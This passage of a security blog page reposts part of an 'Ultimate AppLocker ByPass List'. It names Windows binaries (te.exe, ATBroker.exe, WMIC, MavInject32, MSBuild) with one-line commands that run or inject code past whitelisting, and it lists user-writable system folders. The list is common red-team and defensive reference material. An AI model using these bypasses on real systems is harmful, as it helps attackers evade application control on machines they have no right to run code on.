+<p>Links:<br><a href="https://gist.github.com/NickTyrer/6ef02ce3fd623483137b45f65017352b" target="_blank" rel="noopener">https://gist.github.com/NickTyrer/6ef02ce3fd623483137b45f65017352b</a></p>
+<h2 id="te-exe"><a href="#te-exe" class="headerlink" title="te.exe"></a>te.exe</h2><p><code>te.exe bypass.wsc</code></p>
+<p>Requires admin: No</p>
+<p>Notes: Can be used if the Test Authoring and Execution Framework is installed and is in a path that is whitelisted.<br>Default location is: C:\program files (x86)\Windows Kits\10\testing\Runtimes\TAEF</p>
+<p>Links:<br><a href="https://twitter.com/gN3mes1s/status/927680266390384640" target="_blank" rel="noopener">https://twitter.com/gN3mes1s/status/927680266390384640</a><br><a href="https://gist.github.com/N3mes1s/5b75a4cd6aa4d41bb742acace2c8ab42" target="_blank" rel="noopener">https://gist.github.com/N3mes1s/5b75a4cd6aa4d41bb742acace2c8ab42</a></p>
+<h2 id="Placing-files-in-writeable-paths-under-c-windows"><a href="#Placing-files-in-writeable-paths-under-c-windows" class="headerlink" title="Placing files in writeable paths under c:\windows"></a>Placing files in writeable paths under c:\windows</h2><p>The following folders are by default writable and executable by normal users<br><code>C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys</code><br><code>C:\Windows\System32\spool\drivers\color</code><br><code>C:\Windows\Tasks</code><br><code>C:\windows\tracing</code></p>
+<p>Requires admin: No</p>
+<p>Notes: This list is based on Windows 10 1709. Run accesschk to verify on other Windows versions</p>
+<h2 id="Atbroker-exe"><a href="#Atbroker-exe" class="headerlink" title="Atbroker.exe"></a>Atbroker.exe</h2><p><code>ATBroker.exe /start malware</code></p>
+<p>Requires admin: No</p>
+<p>Notes:</p>
+<p>Links:<br><a href="http://www.hexacorn.com/blog/2016/07/22/beyond-good-ol-run-key-part-42/" target="_blank" rel="noopener">http://www.hexacorn.com/blog/2016/07/22/beyond-good-ol-run-key-part-42/</a></p>
+<h2 id="WMIC-exe"><a href="#WMIC-exe" class="headerlink" title="WMIC.exe"></a>WMIC.exe</h2><p><code>wmic process call create calc</code></p>
+<p>Requires admin: No</p>
+<p>Notes: </p>
+<p>Links:<br><a href="https://stackoverflow.com/questions/24658745/wmic-how-to-use-process-call-create-with-a-specific-working-directory" target="_blank" rel="noopener">https://stackoverflow.com/questions/24658745/wmic-how-to-use-process-call-create-with-a-specific-working-directory</a></p>
+<h2 id="MavInject32-exe"><a href="#MavInject32-exe" class="headerlink" title="MavInject32.exe"></a>MavInject32.exe</h2><p><code>MavInject32.exe &lt;PID&gt; /INJECTRUNNING &lt;PATH DLL&gt;</code></p>
+<p>Requires admin: No</p>
+<p>Notes: </p>
+<p>Links:<br><a href="https://twitter.com/gN3mes1s/status/941315826107510784" target="_blank" rel="noopener">https://twitter.com/gN3mes1s/status/941315826107510784</a><br><a href="https://twitter.com/Hexacorn/status/776122138063409152" target="_blank" rel="noopener">https://twitter.com/Hexacorn/status/776122138063409152</a></p>
+<h1 id="Bypass-DLL-Default-AppLocker-Rules"><a href="#Bypass-DLL-Default-AppLocker-Rules" class="headerlink" title="Bypass DLL Default AppLocker Rules"></a>Bypass DLL Default AppLocker Rules</h1><p>The goal of this list is document a verified list of known bypasses using AppLocker Default Rules for DLL whitelisting.<br>Please contribute and do point out errors or resources I have forgotten.</p>
+<h2 id="Msbuild-exe-1"><a href="#Msbuild-exe-1" class="headerlink" title="Msbuild.exe"></a>Msbuild.exe</h2><p><code>msbuild.exe pshell.xml</code></p>
+<p>Requires admin: No</p>
+<p>Notes:</p>
+<p>Links:<br><a href="https://github.com/Cn33liz/MSBuildShell" target="_blank" rel="noopener">https://github.com/Cn33liz/MSBuildShell</a><br><a href="https://github.com/Cn33liz/MS17-012" target="_blank" rel="noopener">https://github.com/Cn33liz/MS17-012</a><br><a href="https://pentestlab.blog/2017/05/29/applocker-bypass-msbuild/" target="_blank" rel="noopener">https://pentestlab.blog/2017/05/29/applocker-bypass-msbuild/</a><br><a href="https://www.youtube.com/watch?v=aSDEAPXaz28" target="_blank" rel="noopener">https://www.youtube.com/watch?v=aSDEAPXaz28</a><br><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Execution/Trusted_Developer_Utilities.md" target="_blank" rel="noopener">https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Execution/Trusted_Developer_Utilities.md</a></p>
+</span>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/每日安全干货及动态-1.html" rel="prev">每日安全干货及动态--第二期</a>
+            
+</div>
+
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/GreatSCT.html" rel="next">GreatSCT | MSF  | 白名单</a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div>
+      
+        <style type="text/css">
+
+    .donate_bar {
+        text-align: center;
+        margin-top : 5%;
+    }
+
+    .donate_bar.hidden {
+        display:none;
+    }
+/*
+    .donate_bar a.btn_donate {
+        display: inline-block;
+        width: 82px;
+        height: 82px;
+        margin-left:auto;
+        margin-right:auto;
+
+        background: url("http://img.t.sinajs.cn/t5/style/images/apps_PRF/e_media/btn_reward.gif") no-repeat;
+        _background: url("http://img.t.sinajs.cn/t5/style/images/apps_PRF/e_media/btn_reward.gif") no-repeat; 
+
+        -webkit-transition: background 0s;
+        -moz-transition: background 0s;
+        -o-transition: background 0s;
+        -ms-transition: background 0s;
+        transition: background 0s;
+    }
+*/
+    .donate_bar a.btn_donate:hover { 
+        // background-position: 0px -82px;
+        color: #87daff
+    }
+
+    .donate_bar .donate_txt {
+        display: block;
+        color: #9d9d9d;
+        font: 14px/2 "Microsoft Yahei";
+    }
+
+    .bold { 
+        font-weight: bold; 
+    }
+
+    .post-donate a {
+        border-bottom: 0px;
+    }
+
+    #donate_guide table {
+        border: none;
+    }
+
+    #donate_guide td {
+        border-bottom: none;
+        border-right: none;
+        background: #333333;
+        valign: top;
+    }
+
+</style>
+
+
+
+    
+
+    <div class="post-donate">
+        <div id="donate_board" class="donate_bar center">
+              <a id="btn_donate" class="btn_donate" href="javascript:;" title="打赏">赏</a>
+              <span id="donate_txt" class="donate_txt">
+                   
+                        欢迎加入即刻安全和低调群
+                   
+              </span>
+            <br>
+        </div>  
+  
+        <div id="donate_guide" class="donate_bar center hidden">
+            <!--
+            
+                <a href="https://demonsec666.oss-cn-qingdao.aliyuncs.com/qrcode_1550715250891.jpg" title="支付宝打赏" class="fancybox" rel="article0" 
+                    style="float:left;margin-left:25%;margin-right:10px;">
+                    <img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/qrcode_1550715250891.jpg" title="" height="164px" width="164px">
+                </a> 
+              
+
+            
+                <a href="https://demonsec666.oss-cn-qingdao.aliyuncs.com/qrcode_1550715240236.jpg" title="微信打赏" class="fancybox" rel="article0"
+                    style="margin-right:30%">
+                    <img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/qrcode_1550715240236.jpg" title="" height="164px" width="164px">
+                </a>
+            
+            -->
+            <table>
+                <tr>
+                    <td>
+                        
+                            <a href="https://demonsec666.oss-cn-qingdao.aliyuncs.com/qrcode_1550715250891.jpg" title="支付宝打赏" class="fancybox" rel="article0" style="float:left;margin-left:25%;margin-right:10px;">
+                                <img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/qrcode_1550715250891.jpg" title height="164px" width="164px">
+                            </a> 
+                         
+                    </td>
+                    <td>
+                        
+                            <a href="https://demonsec666.oss-cn-qingdao.aliyuncs.com/qrcode_1550715240236.jpg" title="微信打赏" class="fancybox" rel="article0" style="margin-right:30%">
+                                <img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/qrcode_1550715240236.jpg" title height="164px" width="164px">
+                            </a>
+                        
+                    </td>
+                </tr>
+            </table>
+
+        </div>
+
+        <script type="text/javascript">
+            document.getElementById('btn_donate').onclick = function() {
+                $('#donate_board').addClass('hidden');
+                // $('#donate_guide').removeClass('hidden');
+                $('#donate_guide').show(2000);
+            }
+
+        </script>
+    </div>
+
+    
+
+
+      
+    </div>
+
+    <div class="post-spread">
+      
+        <div class="bdsharebuttonbox">
+	<a href="#" class="bds_more" data-cmd="more"></a>
+	<a href="#" class="bds_weixin" data-cmd="weixin" title="分享到微信"></a>
+	<a href="#" class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+	<a href="#" class="bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
+	<a href="#" class="bds_qzone" data-cmd="qzone" title="分享到QQ空间"></a>
+	<a href="#" class="bds_tqq" data-cmd="tqq" title="分享到腾讯微博"></a>
+	<a href="#" class="bds_douban" data-cmd="douban" title="分享到豆瓣网"></a>
+</div>
+<script>
+    window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"1","bdSize":"16"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+</script>
+
+      
+    </div>
+  </div>
+
+ </div>
+
+        
+
+        
+          <div class="comments" id="comments">
+            
+              <div class="ds-thread" data-thread-key="UltimateAppLockerByPassList.html" data-title="Ultimate AppLocker ByPass List" data-url="www.ggsec.cn/UltimateAppLockerByPassList.html">
+              </div>
+            
+          </div>
+        
+      </div>
+
+      
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" src="/images/default_avatar.jpg" alt="Demon‘blog | 没有绝对安全的系统" itemprop="image">
+          <p class="site-author-name" itemprop="name">Demon‘blog | 没有绝对安全的系统</p>
+        </div>
+        <p class="site-description motion-element" itemprop="description">kali|linux|sec|Web|MSF|Win</p>
+        <nav class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="site-state-item-count">156</span>
+              <span class="site-state-item-name">日志</span>
+            </a>
+          </div>
+
+          <div class="site-state-item site-state-categories">
+            
+              <span class="site-state-item-count">9</span>
+              <span class="site-state-item-name">分类</span>
+              
+          </div>
+
+          <div class="site-state-item site-state-tags">
+            <a href="/tags">
+              <span class="site-state-item-count">15</span>
+              <span class="site-state-item-name">标签</span>
+              </a>
+          </div>
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="menu-item-icon icon-next-feed"></i>
+              RSS
+            </a>
+          </div>
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="http://www.secist.com" target="_blank">即刻安全</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://www.airs-sec.com" target="_blank">小城工作室</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://linux.dog" target="_blank">泡泡博客</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://www.webshell.ren" target="_blank">THE博客</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://isbase.cc/" target="_blank">zusheng</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/demonsec666" target="_blank">Demon(Github)</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://www.inksec.cn" target="_blank">Szrzvdny</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://www.xsafe.org/" target="_blank">xsafe</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://bestsec.net" target="_blank">Bang'Blog</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://www.sqlsec.com" target="_blank">国光</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://droidkali.github.io" target="_blank">记忆纯真</a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://www.frostsaber.com/" target="_blank">FrostsaberX 's Blog</a>
+              </span>
+            
+          
+        </div>
+<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="450" src="//music.163.com/outchain/player?type=0&id=377915817&auto=0&height=430"></iframe>
+<div class="links-of-friendly motion-element">
+          
+        </div>
+
+        
+        
+
+      </section>
+
+      
+        <section class="post-toc-wrap sidebar-panel-active">
+          <div class="post-toc-indicator-top post-toc-indicator"></div>
+          <div class="post-toc">
+            
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Rundll32-exe"><span class="nav-number">1.</span> <span class="nav-text">Rundll32.exe</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Regsvr32-exe"><span class="nav-number">2.</span> <span class="nav-text">Regsvr32.exe</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Msbuild-exe"><span class="nav-number">3.</span> <span class="nav-text">Msbuild.exe</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Regsvcs-exe"><span class="nav-number">4.</span> <span class="nav-text">Regsvcs.exe</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Regasm-exe"><span class="nav-number">5.</span> <span class="nav-text">Regasm.exe</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Bginfo-exe"><span class="nav-number">6.</span> <span class="nav-text">Bginfo.exe</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#InstallUtil-exe"><span class="nav-number">7.</span> <span class="nav-text">InstallUtil.exe</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MSDT-exe"><span class="nav-number">8.</span> <span class="nav-text">MSDT.exe</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#mshta-exe"><span class="nav-number">9.</span> <span class="nav-text">mshta.exe</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Execute-Bat"><span class="nav-number">10.</span> <span class="nav-text">Execute .Bat</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Execute-PS1"><span class="nav-number">11.</span> <span class="nav-text">Execute .PS1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Execute-VBS"><span class="nav-number">12.</span> <span class="nav-text">Execute .VBS</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PresentationHost-exe"><span class="nav-number">13.</span> <span class="nav-text">PresentationHost.exe</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#dfsvc-exe"><span class="nav-number">14.</span> <span class="nav-text">dfsvc.exe</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#IEExec-exe"><span class="nav-number">15.</span> <span class="nav-text">IEExec.exe</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#cdb-exe"><span class="nav-number">16.</span> <span class="nav-text">cdb.exe</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#dnx-exe"><span class="nav-number">17.</span> <span class="nav-text">dnx.exe</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#rcsi-exe"><span class="nav-number">18.</span> <span class="nav-text">rcsi.exe</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#csi-exe"><span class="nav-number">19.</span> <span class="nav-text">csi.exe</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CPL-loading-location-manipulation"><span class="nav-number">20.</span> <span class="nav-text">CPL loading location manipulation</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#msxsl-exe"><span class="nav-number">21.</span> <span class="nav-text">msxsl.exe</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#msiexec-exe"><span class="nav-number">22.</span> <span class="nav-text">msiexec.exe</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#cmstp-exe"><span class="nav-number">23.</span> <span class="nav-text">cmstp.exe</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#xwizard-exe"><span class="nav-number">24.</span> <span class="nav-text">xwizard.exe</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#fsi-exe"><span class="nav-number">25.</span> <span class="nav-text">fsi.exe</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#odbcconf-exe"><span class="nav-number">26.</span> <span class="nav-text">odbcconf.exe</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#te-exe"><span class="nav-number">27.</span> <span class="nav-text">te.exe</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Placing-files-in-writeable-paths-under-c-windows"><span class="nav-number">28.</span> <span class="nav-text">Placing files in writeable paths under c:\windows</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Atbroker-exe"><span class="nav-number">29.</span> <span class="nav-text">Atbroker.exe</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WMIC-exe"><span class="nav-number">30.</span> <span class="nav-text">WMIC.exe</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MavInject32-exe"><span class="nav-number">31.</span> <span class="nav-text">MavInject32.exe</span></a></li></ol><li class="nav-item nav-level-1"><a class="nav-link" href="#Bypass-DLL-Default-AppLocker-Rules"><span class="nav-number"></span> <span class="nav-text">Bypass DLL Default AppLocker Rules</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Msbuild-exe-1"><span class="nav-number">1.</span> <span class="nav-text">Msbuild.exe</span></a></li></ol></li></div>
+            
+          </div>
+          <div class="post-toc-indicator-bottom post-toc-indicator"></div>
+        </section>
+      
+
+    </div>
+  </aside>
+
+
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner"> <div class="copyright">
+  
+  &copy; &nbsp; 
+  <span itemprop="copyrightYear">2019
+  </span>
+  <span class="with-love">
+    <i class="icon-next-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Demon‘blog | 没有绝对安全的系统
+  </span>
+</div>
+
+<div class="powered-by">
+  Powered by <a class="theme-link" href="http://hexo.io">Hexo</a>
+</div>
+
+<div class="theme-info">
+  Theme by <a class="theme-link" href="http://blog.idhyt.com">idhyt</a>.<a class="theme-link" href="https://github.com/idhyt/hexo-theme-next/tree/magiclamp">Mala</a>
+</div>
+
+<!-- busuanzi -->
+
+  <div class="busuanzi-info">
+    <div class="theme-info">
+    <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+    </script>
+    <span id="busuanzi_container_site_pv">
+        本站总访问量<a class="theme-link"><span id="busuanzi_value_site_pv"></span></a>次 |
+	本站访客数<span id="busuanzi_value_site_uv"></span>人次
+    </span>
+</div>
+
+  </div>
+
+
+
+ </div>
+    </footer>
+
+    <div class="back-to-top"></div>
+  </div>
+
+  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>
+
+  
+  
+  
+    
+
+  
+    
+  
+
+  <script type="text/javascript">
+    var duoshuoQuery = {short_name:"demonsec"};
+    (function() {
+      var ds = document.createElement('script');
+      ds.type = 'text/javascript';ds.async = true;
+      ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+      ds.charset = 'UTF-8';
+      (document.getElementsByTagName('head')[0]
+      || document.getElementsByTagName('body')[0]).appendChild(ds);
+    })();
+  </script>
+    
+
+    
+  
+  
+  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js"></script>
+  <script type="text/javascript" src="/js/fancy-box.js?v=0.4.5.1"></script>
+
+
+  <script type="text/javascript" src="/js/helpers.js?v=0.4.5.1"></script>
+  
+
+  <script type="text/javascript" src="/vendors/velocity/velocity.min.js"></script>
+  <script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js"></script>
+
+  <script type="text/javascript" src="/js/motion_global.js?v=0.4.5.1" id="motion.global"></script>
+
+
+
+
+  <script type="text/javascript" src="/js/nav-toggle.js?v=0.4.5.1"></script>
+  <script type="text/javascript" src="/vendors/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  
+<script type="text/javascript" src="/js/bootstrap.scrollspy.js?v=0.4.5.1" id="bootstrap.scrollspy.custom"></script>
+
+
+<script type="text/javascript" id="sidebar.toc.highlight">
+  $(document).ready(function () {
+    var tocSelector = '.post-toc';
+    var $tocSelector = $(tocSelector);
+    var activeCurrentSelector = '.active-current';
+
+    $tocSelector
+      .on('activate.bs.scrollspy', function () {
+        var $currentActiveElement = $(tocSelector + ' .active').last();
+
+        removeCurrentActiveClass();
+        $currentActiveElement.addClass('active-current');
+
+        $tocSelector[0].scrollTop = $currentActiveElement.position().top;
+      })
+      .on('clear.bs.scrollspy', function () {
+        removeCurrentActiveClass();
+      });
+
+    function removeCurrentActiveClass () {
+      $(tocSelector + ' ' + activeCurrentSelector)
+        .removeClass(activeCurrentSelector.substring(1));
+    }
+
+    function processTOC () {
+      getTOCMaxHeight();
+      toggleTOCOverflowIndicators();
+    }
+
+    function getTOCMaxHeight () {
+      var height = $('.sidebar').height() -
+                   $tocSelector.position().top -
+                   $('.post-toc-indicator-bottom').height();
+
+      $tocSelector.css('height', height);
+
+      return height;
+    }
+
+    function toggleTOCOverflowIndicators () {
+      tocOverflowIndicator(
+        '.post-toc-indicator-top',
+        $tocSelector.scrollTop() > 0 ? 'show' : 'hide'
+      );
+
+      tocOverflowIndicator(
+        '.post-toc-indicator-bottom',
+        $tocSelector.scrollTop() >= $tocSelector.find('ol').height() - $tocSelector.height() ? 'hide' : 'show'
+      )
+    }
+
+    $(document).on('sidebar.motion.complete', function () {
+      processTOC();
+    });
+
+    $('body').scrollspy({ target: tocSelector });
+    $(window).on('resize', function () {
+      if ( $('.sidebar').hasClass('sidebar-active') ) {
+        processTOC();
+      }
+    });
+
+    onScroll($tocSelector);
+
+    function onScroll (element) {
+      element.on('mousewheel DOMMouseScroll', function (event) {
+          var oe = event.originalEvent;
+          var delta = oe.wheelDelta || -oe.detail;
+
+          this.scrollTop += ( delta < 0 ? 1 : -1 ) * 30;
+          event.preventDefault();
+
+          toggleTOCOverflowIndicators();
+      });
+    }
+
+    function tocOverflowIndicator (indicator, action) {
+      var $indicator = $(indicator);
+      var opacity = action === 'show' ? 0.4 : 0;
+      $indicator.velocity ?
+        $indicator.velocity('stop').velocity({
+          opacity: opacity
+        }, { duration: 100 }) :
+        $indicator.stop().animate({
+          opacity: opacity
+        }, 100);
+    }
+
+  });
+</script>
+
+<script type="text/javascript" id="sidebar.nav">
+  $(document).ready(function () {
+    var html = $('html');
+    var TAB_ANIMATE_DURATION = 200;
+    var hasVelocity = $.isFunction(html.velocity);
+
+    $('.sidebar-nav li').on('click', function () {
+      var item = $(this);
+      var activeTabClassName = 'sidebar-nav-active';
+      var activePanelClassName = 'sidebar-panel-active';
+      if (item.hasClass(activeTabClassName)) {
+        return;
+      }
+
+      var currentTarget = $('.' + activePanelClassName);
+      var target = $('.' + item.data('target'));
+
+      hasVelocity ?
+        currentTarget.velocity('transition.slideUpOut', TAB_ANIMATE_DURATION, function () {
+          target
+            .velocity('stop')
+            .velocity('transition.slideDownIn', TAB_ANIMATE_DURATION)
+            .addClass(activePanelClassName);
+        }) :
+        currentTarget.animate({ opacity: 0 }, TAB_ANIMATE_DURATION, function () {
+          currentTarget.hide();
+          target
+            .stop()
+            .css({'opacity': 0, 'display': 'block'})
+            .animate({ opacity: 1 }, TAB_ANIMATE_DURATION, function () {
+              currentTarget.removeClass(activePanelClassName);
+              target.addClass(activePanelClassName);
+            });
+        });
+
+      item.siblings().removeClass(activeTabClassName);
+      item.addClass(activeTabClassName);
+    });
+
+    $('.post-toc a').on('click', function (e) {
+      e.preventDefault();
+      var targetSelector = escapeSelector(this.getAttribute('href'));
+      var offset = $(targetSelector).offset().top;
+      hasVelocity ?
+        html.velocity('stop').velocity('scroll', {
+          offset: offset  + 'px',
+          mobileHA: false
+        }) :
+        $('html, body').stop().animate({
+          scrollTop: offset
+        }, 500);
+    });
+
+    // Expand sidebar on post detail page by default, when post has a toc.
+    var $tocContent = $('.post-toc-content');
+    if (isDesktop() && CONFIG.sidebar === 'post') {
+      if ($tocContent.length > 0 && $tocContent.html().trim().length > 0) {
+        displaySidebar();
+      }
+    }
+  });
+</script>
+
+
+
+  <script type="text/javascript">
+    $(document).ready(function () {
+      if (CONFIG.sidebar === 'always') {
+        displaySidebar();
+      }
+      if (isMobile()) {
+        FastClick.attach(document.body);
+      }
+    });
+  </script>
+
+  
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/lazyload.js"></script>
+  <script type="text/javascript">
+    $(function () {
+      $("#posts").find('img').lazyload({
+        placeholder: "/images/loading.gif",
+        effect: "fadeIn"
+      });
+    });
+  </script>
+</body>
+</html>
